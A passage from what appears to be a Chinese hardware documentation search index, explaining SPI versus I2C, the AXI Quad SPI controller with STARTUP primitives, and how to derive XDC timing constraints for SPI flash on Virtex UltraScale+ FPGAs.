\u200b\u63a5\u53e3\u200b\u8bbf\u95ee\u200b\u7684\u200b\uff0c\u200b\u5728\u200b Linux \u200b\u4e2d\u6709\u200b\u76f8\u5e94\u200b\u7684\u200b applespi \u200b\u9a71\u52a8\u200b\u3002</p>"},{"location":"hardware/spi.html#spi-vs-i2c","title":"SPI vs I2C","text":"<p>SPI \u200b\u548c\u200b I2C \u200b\u7684\u200b\u533a\u522b\u200b\u5728\u4e8e\u200b\uff0c\u200b\u524d\u8005\u200b\u4fe1\u53f7\u200b\u66f4\u200b\u591a\u200b\uff0c\u200b\u5168\u53cc\u5de5\u200b\u4f20\u8f93\u200b\uff1b\u200b\u540e\u8005\u200b\u4fe1\u53f7\u200b\u66f4\u200b\u5c11\u200b\uff0c\u200b\u534a\u53cc\u5de5\u200b\u4f20\u8f93\u200b\u3002SPI \u200b\u901a\u8fc7\u200b CS \u200b\u4fe1\u53f7\u200b\u9009\u62e9\u200b Slave \u200b\u82af\u7247\u200b\uff0cI2C \u200b\u901a\u8fc7\u200b\u5730\u5740\u200b\u8fdb\u884c\u200b\u533a\u5206\u200b\u3002\u200b\u6b64\u5916\u200b I2C \u200b\u8fd8\u200b\u9700\u8981\u200b Pull up resistor\uff0c\u200b\u8fd9\u6837\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u8bbe\u5907\u200b\u54cd\u5e94\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b NACK\u3002</p> <p>\u200b\u4e00\u4e9b\u200b\u82af\u7247\u200b\u63d0\u4f9b\u200b\u4e86\u200b SPI \u200b\u6216\u200b I2C \u200b\u7684\u200b\u9009\u9879\u200b\uff1a\u200b\u5171\u7528\u200b\u4e24\u4e2a\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u5141\u8bb8\u200b\u7528\u6237\u200b\u9009\u62e9\u200b\u7528\u200b I2C \u200b\u8fd8\u662f\u200b SPI\u3002\u200b\u4f8b\u5982\u200b WM8731\uff0c\u200b\u65e2\u200b\u652f\u6301\u200b I2C\uff08\u200b\u8bb0\u200b\u4e3a\u200b 2-wire mode\uff09\uff0c\u200b\u53c8\u200b\u652f\u6301\u200b SPI\uff08\u200b\u8bb0\u200b\u4e3a\u200b 3-wire mode\uff09\u3002\u200b\u4e00\u822c\u200b\u8fd9\u79cd\u200b\u65f6\u5019\u200b\uff0cSPI \u200b\u548c\u200b I2C \u200b\u5c31\u662f\u200b\u7528\u6765\u200b\u914d\u7f6e\u200b\u4e00\u4e9b\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\uff0c\u200b\u53e6\u5916\u200b\u53ef\u80fd\u200b\u8fd8\u6709\u200b\u4e00\u4e9b\u200b\u63a5\u53e3\u200b\uff0c\u200b\u4f8b\u5982\u200b WM8731 \u200b\u8d1f\u8d23\u200b\u58f0\u97f3\u200b\u6570\u636e\u4f20\u8f93\u200b\u7684\u200b\u5b9e\u9645\u4e0a\u200b\u662f\u200b I2S\u3002</p>"},{"location":"hardware/spi.html#axi-quad-spi","title":"AXI Quad SPI","text":"<p>AXI Quad SPI \u200b\u662f\u200b\u4e00\u4e2a\u200b SPI \u200b\u534f\u8bae\u200b\u7684\u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u5b83\u200b\u652f\u6301\u200b XIP\uff08eXecute In Place\uff09\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u5373\u200b\u53ef\u4ee5\u200b\u66b4\u9732\u200b\u4e00\u4e2a\u200b\u53ea\u8bfb\u200b AXI Slave \u200b\u63a5\u53e3\u200b\uff0c\u200b\u5f53\u200b\u63a5\u6536\u200b\u5230\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u53d1\u9001\u200b SPI NOR Flash \u200b\u547d\u4ee4\u200b\u53bb\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5730\u5740\u200b\u8fdb\u884c\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u7136\u540e\u200b\u8fd4\u56de\u200b\u7ed3\u679c\u200b\u3002\u200b\u7531\u4e8e\u200b\u4e0d\u540c\u200b\u5382\u5bb6\u200b\u7684\u200b SPI NOR Flash \u200b\u652f\u6301\u200b\u6709\u6240\u4e0d\u540c\u200b\uff0c\u200b\u6240\u4ee5\u200b IP \u200b\u4e0a\u200b\u7684\u200b\u8bbe\u7f6e\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5382\u5bb6\u200b\u7684\u200b\u9009\u62e9\u200b\u3002</p> <p>\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u9700\u6c42\u200b\u662f\u200b\u5e0c\u671b\u200b\u8bbf\u95ee\u200b Cfg\uff08Configuration\uff09Flash\uff0c\u200b\u4ea6\u200b\u5373\u200b\u7528\u6765\u200b\u4fdd\u5b58\u200b Bitstream \u200b\u7684\u200b Flash\u3002\u200b\u5f53\u200b FPGA \u200b\u4e0a\u7535\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u542f\u52a8\u200b\u6a21\u5f0f\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b SPI Flash\uff0cFPGA \u200b\u5c31\u200b\u4f1a\u200b\u5411\u200b Cfg Flash \u200b\u8bfb\u53d6\u200b Bitstream\uff0cCfg Flash \u200b\u9700\u8981\u200b\u8fde\u63a5\u200b\u5230\u200b FPGA \u200b\u7684\u200b\u6307\u5b9a\u200b\u5f15\u811a\u200b\u4e0a\u200b\uff0c\u200b\u5f53\u200b FPGA \u200b\u521d\u59cb\u5316\u200b\u7684\u200b\u65f6\u5019\u200b\u7531\u200b\u5185\u90e8\u200b\u903b\u8f91\u200b\u9a71\u52a8\u200b\uff0c\u200b\u521d\u59cb\u5316\u200b\u5b8c\u6210\u200b\u540e\u200b\u53c8\u200b\u8981\u200b\u8f6c\u200b\u4ea4\u7ed9\u200b\u7528\u6237\u200b\u903b\u8f91\u200b\u3002\u200b\u8f6c\u4ea4\u200b\u7684\u200b\u65b9\u5f0f\u200b\u5c31\u662f\u200b\u901a\u8fc7\u200b STARTUP \u200b\u7cfb\u5217\u200b\u7684\u200b primitive\u3002</p> <p>\u200b\u901a\u5e38\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u8fde\u63a5\u200b\u5916\u90e8\u200b\u7684\u200b SPI Flash\uff0c\u200b\u9700\u8981\u200b\u8fde\u63a5\u200b\u51e0\u6761\u200b\u4fe1\u53f7\u7ebf\u200b\u5230\u200b\u9876\u5c42\u200b\uff0c\u200b\u7136\u540e\u200b\u901a\u8fc7\u200b xdc \u200b\u628a\u200b\u4fe1\u53f7\u200b\u7ed1\u5b9a\u200b\u5230\u200b\u5f15\u811a\u200b\u4e0a\u200b\uff0c\u200b\u7136\u540e\u200b\u5f15\u811a\u200b\u8fde\u63a5\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5916\u90e8\u200b\u7684\u200b SPI Flash\u3002\u200b\u4f46\u200b\u7531\u4e8e\u200b Cfg Flash \u200b\u6bd4\u8f83\u200b\u7279\u6b8a\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4fe1\u53f7\u200b\u4ece\u200b AXI Quad SPI \u200b\u76f4\u63a5\u200b\u8fde\u200b\u5230\u200b STARTUP \u200b\u7cfb\u5217\u200b\u7684\u200b primitive \u200b\u4e0a\u200b\u3002\u200b\u5982\u679c\u200b\u662f\u200b\u91c7\u7528\u200b STARTUPE2 \u200b\u539f\u8bed\u200b\u7684\u200b 7 \u200b\u7cfb\u5217\u200b\u7684\u200b FPGA\uff0c\u200b\u90a3\u4e48\u200b\u53ea\u6709\u200b\u65f6\u949f\u200b\u4f1a\u200b\u901a\u8fc7\u200b STARTUPE2 pritimive \u200b\u8fde\u63a5\u200b\u5230\u200b SPI Flash \u200b\u4e0a\u200b\uff0c\u200b\u5176\u4ed6\u200b\u6570\u636e\u4fe1\u53f7\u200b\u8fd8\u662f\u200b\u6b63\u5e38\u200b\u901a\u8fc7\u200b\u9876\u5c42\u200b\u7ed1\u5b9a\u200b\uff1b\u200b\u5982\u679c\u200b\u662f\u200b\u91c7\u7528\u200b STARTUPE3 \u200b\u539f\u8bed\u200b\u7684\u200b UltraScale \u200b\u7cfb\u5217\u200b\u7684\u200b FPGA\uff0c\u200b\u90a3\u4e48\u200b\u65f6\u949f\u200b\u548c\u200b\u6570\u636e\u200b\u90fd\u200b\u901a\u8fc7\u200b STARTUPE3 primitive \u200b\u8fde\u63a5\u200b\u5230\u200b SPI Flash\u3002</p>"},{"location":"hardware/spi.html#virtex-ultrascale","title":"Virtex UltraScale+ \u200b\u65f6\u5e8f","text":"<p>\u200b\u628a\u200b\u4fe1\u53f7\u200b\u8fde\u597d\u200b\u4e86\u200b\u53ea\u662f\u200b\u7b2c\u4e00\u6b65\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5916\u8bbe\u200b\u5bf9\u200b\u65f6\u5e8f\u200b\u8981\u6c42\u200b\u6bd4\u8f83\u590d\u6742\u200b\uff0c\u200b\u5982\u679c\u200b\u7528\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u200b\u9ad8\u200b\u76f4\u63a5\u200b\u8dd1\u200b\uff0c\u200b\u5f88\u5927\u200b\u53ef\u80fd\u200b\u5c31\u200b\u8bfb\u53d6\u200b\u5230\u200b\u9519\u8bef\u200b\u7684\u200b\u6570\u636e\u200b\u4e86\u200b\u3002AXI Quad SPI \u200b\u5df2\u7ecf\u200b\u5728\u200b\u751f\u6210\u200b\u7684\u200b\u6587\u4ef6\u200b\u91cc\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u6837\u200b\u4f8b\u200b\u7684\u200b xdc\uff0c\u200b\u5728\u200b\u6587\u6863\u200b\u91cc\u200b\u4e5f\u200b\u6709\u200b\u4f53\u73b0\u200b\u3002\u200b\u5bf9\u4e8e\u200b Virtex Ultrascale+ \u200b\u7cfb\u5217\u200b\u7684\u200b FPGA\uff0c\u200b\u5b83\u200b\u5185\u5bb9\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>#### All the delay numbers have to be provided by the user\n\n#### Following are the SPI device parameters\n#### Max Tco\nset tco_max 7\n#### Min Tco\nset tco_min 1\n#### Setup time requirement\nset tsu 2\n#### Hold time requirement\nset th 3\n#####################################################################################################\n# STARTUPE3 primitive included inside IP for US+                                                             #\n#####################################################################################################\nset tdata_trace_delay_max 0.25\nset tdata_trace_delay_min 0.25\nset tclk_trace_delay_max 0.2\nset tclk_trace_delay_min 0.2\n\ncreate_generated_clock -name clk_sck -source [get_pins -hierarchical *axi_quad_spi_0/ext_spi_clk] [get_pins -hierarchical */CCLK] -edges {3 5 7}\nset_input_delay -clock clk_sck -max [expr $tco_max + $tdata_trace_delay_max + $tclk_trace_delay_max] [get_pins -hierarchical *STARTUP*/DATA_IN[*]] -clock_fall;\nset_input_delay -clock clk_sck -min [expr $tco_min + $tdata_trace_delay_min + $tclk_trace_delay_min] [get_pins -hierarchical *STARTUP*/DATA_IN[*]] -clock_fall;\nset_multicycle_path 2 -setup -from clk_sck -to [get_clocks -of_objects [get_pins -hierarchical */ext_spi_clk]]\nset_multicycle_path 1 -hold -end -from clk_sck -to [get_clocks -of_objects [get_pins -hierarchical */ext_spi_clk]]\nset_output_delay -clock clk_sck -max [expr $tsu + $tdata_trace_delay_max - $tclk_trace_delay_min] [get_pins -hierarchical *STARTUP*/DATA_OUT[*]];\nset_output_delay -clock clk_sck -min [expr $tdata_trace_delay_min - $th - $tclk_trace_delay_max] [get_pins -hierarchical *STARTUP*/DATA_OUT[*]];\nset_multicycle_path 2 -setup -start -from [get_clocks -of_objects [get_pins -hierarchical */ext_spi_clk]] -to clk_sck\nset_multicycle_path 1 -hold -from [get_clocks -of_objects [get_pins -hierarchical */ext_spi_clk]] -to clk_sck\n</code></pre> <p>\u200b\u5206\u6bb5\u200b\u6765\u770b\u200b\u8fd9\u4e2a\u200b xdc \u200b\u90fd\u200b\u505a\u200b\u4e86\u200b\u4ec0\u4e48\u200b\uff1a</p> <pre><code>create_generated_clock -name clk_sck -source [get_pins -hierarchical *axi_quad_spi_0/ext_spi_clk] [get_pins -hierarchical */CCLK] -edges {3 5 7}\n</code></pre> <p>\u200b\u9996\u5148\u200b\uff0c\u200b\u5b83\u200b\u521b\u5efa\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u65f6\u949f\u200b <code>clk_sck</code>\u3002CCLK \u200b\u662f\u200b STARTUP \u200b\u8f93\u51fa\u200b\u7684\u200b\u5b9e\u9645\u200b\u65f6\u949f\u200b\uff0c\u200b\u4f1a\u200b\u8fde\u63a5\u200b\u5230\u200b Cfg Flash \u200b\u7684\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\u4e0a\u200b\u3002\u200b\u800c\u200b AXI Quad SPI \u200b\u7684\u200b ext_spi_clk \u200b\u4f1a\u200b\u8f93\u51fa\u200b\u5230\u200b CCLK \u200b\u4e0a\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u91cc\u200b\u662f\u200b\u4e00\u4e2a\u200b\u751f\u6210\u200b\u7684\u200b\u65f6\u949f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6307\u5b9a\u200b\u4e0a\u4e0b\u200b\u8fb9\u6cbf\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u3002<code>edges</code> \u200b\u53c2\u6570\u200b\u6709\u200b\u4e09\u4e2a\u200b\uff0c\u200b\u5206\u522b\u200b\u8868\u793a\u200b\u4e0a\u5347\u200b\u3001\u200b\u4e0b\u964d\u200b\u548c\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u5206\u522b\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u30021 \u200b\u8868\u793a\u200b\u6e90\u200b\u65f6\u949f\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u4e0a\u5347\u200b\u6cbf\u200b\uff0c2 \u200b\u8868\u793a\u200b\u6e90\u200b\u65f6\u949f\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u4e0b\u964d\u200b\u6cbf\u200b\uff0c\u200b\u4ee5\u6b64\u7c7b\u63a8\u200b\uff0c\u200b\u6240\u4ee5\u200b {3, 5, 7} \u200b\u7684\u200b\u610f\u601d\u200b\u5c31\u662f\u200b\u9891\u7387\u200b\u51cf\u534a\u200b\uff0c\u200b\u76f8\u4f4d\u5dee\u200b\u534a\u4e2a\u200b\u5468\u671f\u200b\u3002</p> <p>\u200b\u63a5\u7740\u200b\u6700\u200b\u4e3b\u8981\u200b\u7684\u200b\u5c31\u662f\u200b\uff0c\u200b\u600e\u4e48\u200b\u8bbe\u7f6e\u200b\u5ef6\u8fdf\u200b\u3002\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u9996\u5148\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u53c2\u6570\u200b\uff1a</p> <pre><code>#### Max Tco\nset tco_max 7\n#### Min Tco\nset tco_min 1\n#### Setup time requirement\nset tsu 2\n#### Hold time requirement\nset th 3\n\n#### Trace delay\nset tdata_trace_delay_max 0.25\nset tdata_trace_delay_min 0.25\nset tclk_trace_delay_max 0.2\nset tclk_trace_delay_min 0.2\n</code></pre> <p>\u200b\u9996\u5148\u200b\u662f\u200b \\(t_{co}\\)\uff0c\u200b\u8868\u793a\u200b\u7684\u200b\u662f\u200b SPI Flash \u200b\u7684\u200b\u65f6\u949f\u200b\u5230\u200b\u8f93\u51fa\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u3002\u200b\u4ee5\u200b SPI Flash \u200b\u578b\u53f7\u200b Micron MT25QU02GCBB8E12-0SIT \u200b\u4e3a\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u5b83\u200b\u7684\u200b Datasheet \u200b\u770b\u5230\u200b\uff0c\u200b\u65f6\u949f\u200b\u5230\u200b\u8f93\u51fa\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u5e94\u8be5\u200b\u662f\u200b Max 7ns\uff1a</p> <pre><code>Clock LOW to output valid under 30pF Max 7ns\nClock LOW to output valid under 10pF Max 6ns\n</code></pre> <p>\u200b\u56e0\u6b64\u200b <code>tco_max</code> \u200b\u8bbe\u200b\u4e3a\u200b 7\uff0c<code>tco_min</code> \u200b\u9ed8\u8ba4\u200b\u5373\u53ef\u200b\uff0c\u200b\u56e0\u4e3a\u200b Datasheet \u200b\u4e2d\u200b\u6ca1\u6709\u200b\u505a\u200b\u8981\u6c42\u200b\u3002</p> <p>\u200b\u7136\u540e\u200b \\(t_{su}\\) \u200b\u548c\u200b \\(t_h\\) \u200b\u5219\u200b\u662f\u200b\u8f93\u5165\u200b\u7684\u200b setup \u200b\u548c\u200b hold time\u3002\u200b\u7c7b\u4f3c\u200b\u7684\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u67e5\u200b\u5230\u200b SPI Flash \u200b\u7684\u200b\u53c2\u6570\u200b\uff1a</p> <pre><code>Data in setup time Min 2.5ns\nData in hold time Min 2ns\n</code></pre> <p>\u200b\u6240\u4ee5\u200b <code>tsu</code> \u200b\u8bbe\u200b\u4e3a\u200b 2.5\uff0c<code>th</code> \u200b\u8bbe\u200b\u4e3a\u200b 2\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\u5219\u200b\u662f\u200b tdata \u200b\u548c\u200b tclk \u200b\u7684\u200b trace delay\u3002\u200b\u8fd9\u6307\u200b\u7684\u200b\u662f\u4ece\u200b FPGA \u200b\u5f15\u811a\u200b\u5230\u200b SPI Flash \u200b\u5f15\u811a\u200b\u7684\u200b\u4fe1\u53f7\u200b\u4f20\u8f93\u200b\u5ef6\u8fdf\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u5ef6\u8fdf\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u677f\u5b50\u200b\u7684\u200b\u5e03\u7ebf\u200b\u4e0a\u200b\u6d4b\u91cf\u200b\u957f\u5ea6\u200b\u6765\u200b\u4f30\u8ba1\u200b\u51fa\u6765\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u4f30\u7b97\u200b\u65b9\u6cd5\u200b\uff1a\u200b\u5149\u901f\u200b \\(3*10^8 \\mathrm{m/s}\\)\uff0c\u200b\u5047\u8bbe\u200b\u7535\u4fe1\u53f7\u200b\u4f20\u64ad\u901f\u5ea6\u200b\u662f\u200b\u5149\u901f\u200b\u7684\u200b\u4e00\u534a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u5ef6\u8fdf\u200b\u548c\u200b\u957f\u5ea6\u200b\u7684\u200b\u6bd4\u503c\u200b\uff1a \\(0.06 \\mathrm{ns/cm} = 0.15 \\mathrm{ns/inch}\\)\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u8ba8\u8bba\u200b\u8fd9\u4e9b\u200b\u53d8\u91cf\u200b\u5982\u4f55\u200b\u53c2\u4e0e\u200b\u5230\u200b input/output delay \u200b\u7684\u200b\u8ba1\u7b97\u200b\u4e2d\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u8003\u8651\u200b input delay\u3002\u200b\u5b83\u200b\u6307\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u4ece\u200b SPI Flash \u200b\u5230\u200b FPGA \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u76f8\u5bf9\u200b\u4e8e\u200b\u65f6\u949f\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u5ef6\u8fdf\u200b\u7531\u200b\u4e09\u200b\u90e8\u5206\u200b\u7ec4\u6210\u200b\uff1a</p> <ol> <li>\u200b\u4ece\u200b FPGA \u200b\u8f93\u51fa\u200b\u7684\u200b\u65f6\u949f\u200b CCLK \u200b\u5230\u200b SPI Flash \u200b\u7684\u200b\u65f6\u949f\u200b\u6709\u200b\u5ef6\u8fdf\u200b \\(t_{clk}\\)\uff0c\u200b\u4e0b\u56fe\u200b <code>a -&gt; b</code></li> <li>\u200b\u4ece\u200b SPI Flash \u200b\u7684\u200b\u65f6\u949f\u200b\u5230\u200b\u6570\u636e\u200b\u8f93\u51fa\u200b\u6709\u200b\u5ef6\u8fdf\u200b \\(t_{co}\\)\uff0c\u200b\u4e0b\u56fe\u200b <code>b -&gt; c</code></li> <li>\u200b\u4ece\u200b SPI Flash \u200b\u7684\u200b\u6570\u636e\u200b\u5230\u200b FPGA \u200b\u7684\u200b\u6570\u636e\u200b\u8f93\u5165\u200b\u6709\u200b\u5ef6\u8fdf\u200b \\(t_{data}\\)\uff0c\u200b\u4e0b\u56fe\u200b <code>c -&gt; d</code></li> </ol> <p>\u200b\u56e0\u6b64\u200b\u603b\u200b\u5ef6\u8fdf\u200b\u5c31\u662f\u200b \\(t_{clk}+t_{co}+t_{data}\\)\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b\u8bbe\u7f6e\u200b\uff1a</p> <pre><code>set_input_delay -clock clk_sck -max [expr $tco_max + $tdata_trace_delay_max + $tclk_trace_delay_max] [get_pins -hierarchical *STARTUP*/DATA_IN[*]] -clock_fall;\nset_input_delay -clock clk_sck -min [expr $tco_min + $tdata_trace_delay_min + $tclk_trace_delay_min] [get_pins -hierarchical *STARTUP*/DATA_IN[*]] -clock_fall;\n</code></pre> <p>\u200b\u63a5\u4e0b\u6765\u200b\u8981\u200b\u8003\u8651\u200b output delay\u3002\u200b\u867d\u7136\u200b output delay \u200b\u4e5f\u200b\u6709\u200b min \u200b\u548c\u200b max\uff0c\u200b\u4f46\u200b\u5176\u200b\u542b\u4e49\u200b\u6709\u6240\u533a\u522b\u200b\uff0c\u200b\u9700\u8981\u200b\u5206\u522b\u200b\u8003\u8651\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u662f\u200b max\uff0c\u200b\u5b83\u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b setup time\u3002\u200b\u5982\u679c\u200b\u5b9a\u4e49\u200b\u65f6\u95f4\u200b 0 \u200b\u4e3a\u200b\u65f6\u949f\u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u200b\uff0c\u200b\u6cbf\u200b\u66f4\u200b\u65e9\u200b\u7684\u200b\u65f6\u95f4\u200b\u4e3a\u200b\u6b63\u200b\u7684\u200b\u65f6\u95f4\u8f74\u200b\uff0c\u200b\u6cbf\u200b\u66f4\u200b\u665a\u200b\u7684\u200b\u65f6\u95f4\u200b\u4e3a\u200b\u8d1f\u200b\u7684\u200b\u65f6\u95f4\u8f74\u200b\u3002\u200b\u671f\u671b\u200b\u76ee\u6807\u200b\u662f\u200b\uff0c\u200b\u6570\u636e\u200b\u5230\u8fbe\u200b\u5bc4\u5b58\u5668\u200b\u8f93\u5165\u200b\u7684\u200b\u65f6\u95f4\u200b\u5927\u4e8e\u200b setup time\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u6ee1\u8db3\u200b setup \u200b\u6761\u4ef6\u200b\u3002\u200b\u4e3a\u4e86\u200b\u8ba1\u7b97\u200b max output delay\uff0c\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u7684\u200b\u662f\u4ece\u200b FPGA \u200b\u6570\u636e\u200b\u8f93\u51fa\u200b\u5230\u200b SPI Flash \u200b\u4e0a\u200b\u65f6\u949f\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u3002</p> <p>\u200b\u5047\u8bbe\u200b FPGA CCLK \u200b\u65f6\u949f\u200b\u4e0a\u5347\u200b\u6cbf\u5728\u200b \\(0\\) \u200b\u65f6\u523b\u200b\uff08\u200b\u4e0b\u56fe\u200b\u7684\u200b <code>a</code>\uff09\uff0c\u200b\u90a3\u4e48\u200b SPI Flash \u200b\u65f6\u949f\u200b\u4e0a\u5347\u200b\u6cbf\u5728\u200b \\(-t_{clk}\\) \u200b\u65f6\u523b\u200b\uff08\u200b\u4e0b\u56fe\u200b\u7684\u200b <code>b</code>\uff09\u3002\u200b\u5047\u8bbe\u200b FPGA \u200b\u6570\u636e\u200b\u8f93\u51fa\u200b\u65f6\u523b\u200b\u4e3a\u200b \\(t_0\\)\uff08\u200b\u901a\u5e38\u200b\u4e3a\u200b\u6b63\u200b\uff0c\u200b\u4e0b\u56fe\u200b\u7684\u200b <code>c</code>\uff09\uff0c\u200b\u90a3\u4e48\u200b FPGA \u200b\u6570\u636e\u200b\u8f93\u51fa\u200b\u5230\u8fbe\u200b SPI Flash \u200b\u5728\u200b \\(t_0-t_{data}\\) \u200b\u65f6\u523b\u200b\uff08\u200b\u4e0b\u56fe\u200b\u7684\u200b <code>d</code>\uff09\uff0c\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b \\(t_0-t_{data}\\) \u200b\u5728\u200b \\(-t_{clk}\\) \u200b\u65f6\u523b\u200b\u4e4b\u524d\u200b\uff08\u200b\u4e0b\u56fe\u200b\u7684\u200b <code>d -&gt; b</code>\uff09\u200b\u81f3\u5c11\u200b \\(t_{su}\\) \u200b\u65f6\u95f4\u200b\u5230\u8fbe\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u8868\u8fbe\u5f0f\u200b\uff1a</p> \\[ t_0 - t_{data} &gt; -t_{clk} + t_{su} \\] <p>\u200b\u5316\u7b80\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b \\(t_0 &gt; t_{data} + t_{su} - t_{clk}\\)\uff0c\u200b\u5982\u679c\u200b\u8003\u8651\u200b\u6781\u7aef\u200b\u60c5\u51b5\u200b\uff0c\u200b\u53f3\u4fa7\u200b \\(t_{data}\\) \u200b\u53d6\u200b\u6700\u5927\u503c\u200b\uff0c\\(t_{clk}\\) \u200b\u53d6\u200b\u6700\u5c0f\u503c\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u7ea6\u675f\u200b\uff1a</p> <pre><code>set_output_delay -clock clk_sck -max [expr $tsu + $tdata_trace_delay_max - $tclk_trace_delay_min] [get_pins -hierarchical *STARTUP*/DATA_OUT[*]];\n</code></pre> <p>\u200b\u63a5\u4e0b\u6765\u200b\u8003\u8651\u200b output delay \u200b\u7684\u200b min\uff0c\u200b\u8fd9\u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b hold time\u3002\u200b\u6b64\u65f6\u200b\u7684\u200b\u76ee\u6807\u200b\u662f\u200b\u6570\u636e\u200b\u5230\u8fbe\u200b SPI Flash \u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8ddd\u79bb\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u65f6\u95f4\u200b\u8d85\u8fc7\u200b\u4e86\u200b \\(t_h\\)\u3002\u200b\u6309\u7167\u200b\u540c\u6837\u200b\u7684\u200b\u5047\u8bbe\u200b\uff0c\u200b\u5982\u679c\u200b FPGA CCLK \u200b\u65f6\u949f\u200b\u4e0a\u5347\u200b\u6cbf\u5728\u200b 0 \u200b\u65f6\u523b\u200b\uff08\u200b\u4e0b\u56fe\u200b\u7684\u200b <code>a</code>\uff09\uff0c\u200b\u90a3\u4e48\u200b SPI Flash \u200b\u65f6\u949f\u200b\u4e0a\u5347\u200b\u6cbf\u5728\u200b \\(-t_{clk}\\) \u200b\u65f6\u523b\u200b\uff08\u200b\u4e0b\u56fe\u200b\u7684\u200b <code>b</code>\uff09\u3002\u200b\u5047\u8bbe\u200b FPGA \u200b\u6570\u636e\u200b\u8f93\u51fa\u200b\u65f6\u523b\u200b\u4e3a\u200b \\(t_0\\)\uff08\u200b\u4e0b\u56fe\u200b\u7684\u200b <code>c</code>\uff09\uff0c\u200b\u90a3\u4e48\u200b FPGA \u200b\u6570\u636e\u200b\u8f93\u51fa\u200b\u5230\u8fbe\u200b SPI Flash \u200b\u5728\u200b \\(t_0-t_{data}\\) \u200b\u65f6\u523b\u200b\uff08\u200b\u4e0b\u56fe\u200b\u7684\u200b <code>d</code>\uff09\uff0c\u200b\u4e3a\u4e86\u200b\u6ee1\u8db3\u200b hold \u200b\u6761\u4ef6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\uff1a</p> \\[ t_0 - t_{data} &lt; -t_{clk} - t_h \\] <p>\u200b\u5316\u7b80\u200b\u4ee5\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b \\(t_0 &lt; t_{data} - t_{clk} - t_h\\)\uff0c\u200b\u6309\u7167\u200b\u6781\u9650\u200b\u6765\u53d6\u200b\uff0c\\(t_{data}\\) \u200b\u53d6\u200b\u6700\u5c0f\u503c\u200b\uff0c\\(t_{clk}\\) \u200b\u53d6\u200b\u6700\u5927\u503c\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u6700\u7ec8\u200b\u7684\u200b\u65f6\u5e8f\u200b\u7ea6\u675f\u200b\uff1a</p> <pre><code>set_output_delay -clock clk_sck -min [expr $tdata_trace_delay_min - $th - $tclk_trace_delay_max] [get_pins -hierarchical *STARTUP*/DATA_OUT[*]];\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b FPGA \u200b\u548c\u200b SPI Flash 